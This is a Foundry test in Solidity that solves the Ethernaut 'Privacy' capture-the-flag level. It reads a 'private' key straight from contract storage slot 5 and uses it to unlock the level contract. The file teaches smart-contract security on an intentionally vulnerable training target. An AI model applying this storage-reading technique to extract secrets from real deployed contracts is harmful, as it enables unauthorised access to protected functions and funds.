// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testPrivacyHack() public {
        /****************
         * Factory setup *
         *************** */
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        /*
         * In this challenge in order to kind the _key, we need to access bytes32[3] private data;
         * With foundry, we have a helper function "load"
         */
        bytes32 secretData = vm.load(levelAddress, bytes32(uint256(5))); // 5th slot used
        emit log_bytes32(secretData);
        ethernautPrivacy.unlock(bytes16(secretData));
        assertEq(ethernautPrivacy.locked(), false);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
